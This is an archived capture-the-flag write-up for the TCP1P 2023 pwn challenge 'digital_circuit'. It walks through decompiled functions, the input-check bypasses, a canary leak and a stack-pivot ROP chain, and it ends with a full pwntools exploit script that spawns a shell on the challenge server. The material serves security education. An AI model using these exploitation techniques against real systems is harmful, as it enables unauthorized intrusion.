# digital_circuit

**CTF:** TCP1P 2023  
**Category:** pwn  
**Original writeup:** <https://chovid99.github.io/posts/tcp1p-ctf-2023/> — by **chovid99**. All credit goes to the original author; this is an archived copy.

---

Digital Circuit

Description Author: zran Hi, I’m back again. Should be easier this time around. (just an extra pwn chall since there’s still a lot of time left) nc ctf.tcp1p.com 1470

Solution

We were provided with a binary called teleport . Initially, we examine the security mitigations applied to the binary using checksec .

1 2 3 4 5 Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)

Let’s check the disassembly result: cool_thing1

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 unsigned __int64 __fastcall cool_thing1 ( __int64 a1 , int a2 , int a3 , int a4 , int a5 , int a6 ) { int v6 ; // ecx int v7 ; // r8d int v8 ; // r9d unsigned __int64 v10 ; // [rsp+8h] [rbp-18h] BYREF unsigned __int64 v11 ; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v12 ; // [rsp+18h] [rbp-8h] v12 = __readfsqword ( 0x28u ); printf (( unsigned int ) "Give me two special numbers:

> " , a2 , a3 , a4 , a5 , a6 ); _isoc99_scanf (( unsigned int ) "%lu %lu" , ( unsigned int ) & v10 , ( unsigned int ) & v11 , v6 , v7 , v8 ); if ( v10 == v11 ) { puts ( "Different numbers please!" ); } else if ( v10 >= 0x80000000 && v11 >= 0x80000000 ) { if ( ( _DWORD ) v10 == ( _DWORD ) v11 ) { puts ( "

Congrats! Can you explain what's happening here?" ); read ( 0LL , & anu , 0x10LL ); cool_thing2 (); } else { puts ( "Wrong!" ); } } else { puts ( "Too small!" ); } return v12 - __readfsqword ( 0x28u ); }

Reviewing the source code, we see that to bypass the check, we only need to ensure the lower four bytes of our input are the same, while the upper four bytes are different.

cool_thing2

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 unsigned __int64 __fastcall cool_thing2 ( __int64 a1 , int a2 , int a3 , int a4 , int a5 , int a6 ) { int v6 ; // ecx int v7 ; // r8d int v8 ; // r9d __int64 v10 ; // [rsp+0h] [rbp-40h] BYREF __int64 v11 ; // [rsp+8h] [rbp-38h] BYREF char v12 [ 40 ]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v13 ; // [rsp+38h] [rbp-8h] v13 = __readfsqword ( 0x28u ); printf (( unsigned int ) "

Give me another two special numbers:

> " , a2 , a3 , a4 , a5 , a6 ); _isoc99_scanf (( unsigned int ) "%ld %ld" , ( unsigned int ) & v10 , ( unsigned int ) & v11 , v6 , v7 , v8 ); if ( v10 == v11 ) { puts ( "Different numbers please!" ); } else if ( ( float )( int ) v10 == * ( float * ) & v11 ) { (( void ( * )( void )) cool_thing3 )(); puts ( "

Well done hero! What's your name?" ); read ( 0LL , v12 , 0x40LL ); } else { puts ( "Wrong!" ); } return v13 - __readfsqword ( 0x28u ); }

To bypass the above check, we can simply use gdb to determine the casting result of our input v10 , then convert that casting result to hex and use it as the v11 value. Note that there is a buffer overflow in v12 .

cool_thing3

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 unsigned __int64 __fastcall cool_thing3 ( __int64 a1 , int a2 , int a3 , int a4 , int a5 , int a6 ) { int v6 ; // ecx int v7 ; // r8d int v8 ; // r9d int v9 ; // edx int v10 ; // ecx int v11 ; // r8d int v12 ; // r9d double v14 ; // [rsp+0h] [rbp-20h] BYREF double v15 ; // [rsp+8h] [rbp-18h] BYREF char v16 [ 8 ]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v17 ; // [rsp+18h] [rbp-8h] v17 = __readfsqword ( 0x28u ); printf (( unsigned int ) "

Give me one final pair of special numbers:

> " , a2 , a3 , a4 , a5 , a6 ); _isoc99_scanf (( unsigned int ) "%lf %lf" , ( unsigned int ) & v14 , ( unsigned int ) & v15 , v6 , v7 , v8 ); if ( v14 == v15 ) { puts ( "Different numbers please!" ); } else if ( LODWORD ( v14 ) == LODWORD ( v15 ) ) { puts ( "

Horray! Here's a present for you, if you need it..." ); printf (( unsigned int ) "%ld

" , v17 , v9 , v10 , v11 , v12 ); read ( 0LL , v16 , 0x19LL ); } else { puts ( "Wrong!" ); } return v17 - __readfsqword ( 0x28u ); }

To bypass the above check, we can actually re-use the number that we used to bypass cool_thing1 . However, we need to convert the hex to its double representation first. Note that there is a buffer overflow bug here as well. Additionally, this function provides us with a canary leak. The challenge here is, with the limited size of the overflow we can perform, we need to execute a ROP to spawn a shell.

Now that we’re aware of all the bugs, we need to devise a strategy for exploitation. Our approach is as follows:

Write /bin/sh to anu during cool_thing1 .

to during . Bypass cool_thing2 .

. Bypass cool_thing3 . And with the buffer overflow: Pivot RBP to the bss area (let’s refer to it as new_rbp ).

. And with the buffer overflow: Return to cool_thing2 , where we have a second buffer overflow with a much larger size. Here’s what we do: We place some of our ROP payload in the first 0x28 bytes that we send. Overwrite the RBP to new_rbp+0x40 . This is because we want to set up another ROP payload beneath this payload. Overwrite the RIP to cool_thing2+182 to trigger the buffer overflow once more.

, where we have a second buffer overflow with a much larger size. Here’s what we do: Repeat these steps until we have placed all of our ROP payload in the initial 0x28 bytes that we sent during each phase.

bytes that we sent during each phase. In the final step, pivot the RBP to new_rbp-0x40 , so that later, we can jump to our ROP payload.

to , so that later, we can jump to our ROP payload. When it jumps to our ROP payload, we will secure a shell.

In a nut shell, the stack layout of the above approaches will be like this:

1 2 3 4 5 6 7 8 9 10 11 12 13 ROP_payload_1 ( 0x28 bytes ) canary rbp ret ROP_payload_2 ( 0x28 bytes ) canary rbp ret ROP_payload_3 ( 0x28 bytes ) canary rbp ret ...

One important note is that the last 8 byte of our ROP_payload need to pop 3 values, so that we can continue to our next ROP payload.

Below is the full script that we use:

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 from pwn import * context . arch = 'amd64' context . encoding = 'latin' context . log_level = 'INFO' warnings . simplefilter ( "ignore" ) # r = process('./teleport', env={}) r = remote ( 'ctf.tcp1p.com' , 1470 ) exe = ELF ( './teleport' ) # Set anu to /bin/sh x = 0x8100000001 y = 0x8200000001 r . sendlineafter ( b 'numbers:

' , f ' { x } { y } ' . encode ()) r . sendafter ( b 'here?' , b '/bin/sh \x00 ' ) # Another bypass x = 0x3f800000 y = 0x4e7e0000 r . sendlineafter ( b 'numbers:

' , f ' { x } { y } ' . encode ()) # Leak canary r . sendlineafter ( b 'numbers:

' , f '2.73737457035e-312 2.71615461244e-312' . encode ()) r . recvuntil ( b 'it...

' ) canary = int ( r . recvline () . strip ()) & ( 2 ** 64 - 1 ) info ( f ' { hex ( canary ) = } ' ) # Pivot RBP to exe.bss() new_rbp = 0x4e9100 payload = b 'a' * 8 payload += p64 ( canary ) payload += p64 ( new_rbp ) r . send ( payload ) pop_rdi = 0x000000000040251f pop_rsi = 0x004b569f pop_rdx_rbx = 0x00000000004a3dcb pop_rax = 0x004a410a pop_r13_r14_r15 = 0x004b5c7c syscall_ret = 0x00497be9 # Why do we need pop_r13_r14_r15? Because we need to throw 3 useless value so that our ROP # will continue to the next ROP payload that we set in the next read call. payload = p64 ( pop_rdi ) + p64 ( exe . sym . anu ) + p64 ( pop_rsi ) + p64 ( 0 ) + p64 ( pop_r13_r14_r15 ) payload += p64 ( canary ) payload += p64 ( new_rbp + 0x40 ) payload += p64 ( exe . sym . cool_thing2 + 182 ) # cool_thing2+182 r . sendafter ( b 'name?

' , payload ) payload = p64 ( pop_rax ) + p64 ( 0x3b ) + p64 ( pop_rax ) + p64 ( 0x3b ) + p64 ( pop_r13_r14_r15 ) payload += p64 ( canary ) payload += p64 ( new_rbp + 0x40 * 2 ) payload += p64 ( exe . sym . cool_thing2 + 182 ) # cool_thing2+182 r . send ( payload ) payload = p64 ( pop_rdx_rbx ) + p64 ( 0 ) + p64 ( 0 ) + p64 ( syscall_ret ) + b 'c' * 8 payload += p64 ( canary ) payload += p64 ( new_rbp - 0x40 ) payload += p64 ( exe . sym . cool_thing2 + 182 ) # cool_thing2+182 r . send ( payload ) payload = b 'd' * 0x28 payload += p64 ( canary ) payload += p64 ( new_rbp ) payload += p64 ( pop_rdi + 1 ) # cool_thing2+182 r . send ( payload ) r . interactive ()

Flag: TCP1P{ju5T_4n0tH3r_p1vOt_ch4LlEn9e}
